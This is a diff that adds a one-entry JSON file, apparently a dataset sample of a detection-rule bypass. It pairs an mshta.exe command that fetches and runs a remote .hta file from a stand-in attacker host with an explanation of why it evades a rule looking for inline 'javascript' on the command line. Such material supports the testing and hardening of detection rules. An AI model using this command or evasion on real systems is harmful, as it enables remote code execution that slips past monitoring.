@@ -1,0 +1,6 @@
+[
+  {
+    "output": "mshta.exe http://attacker.com/payload.hta",
+    "explanation": "The rule focuses on inline 'javascript' execution via the command line. By hosting the malicious JavaScript/VBScript inside a remote .hta file and calling the URL, the 'javascript' keyword never appears in the process creation event's command line, effectively bypassing the 'selection\\_cli' filter."
+  }
+]
